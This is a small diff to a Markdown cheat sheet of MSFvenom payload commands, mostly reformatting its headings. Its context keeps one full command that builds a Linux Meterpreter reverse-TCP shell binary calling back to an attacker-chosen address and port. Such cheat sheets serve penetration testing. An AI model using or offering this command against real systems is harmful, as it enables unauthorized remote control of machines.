@@ -1,11 +1,10 @@
-### msfvenom
+# MSFvenom payload creator
 
-#### Payloads list
-```
-msfvenom -l
-```
-#### Binaries
-- Linux
+- [Binaries](#Binaries)
+    - [Linux](##Linux)
+
+# Binaries
+- ## Linux
   - Meterpreter reverse shell
     - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
   - Meterpreter bind shell
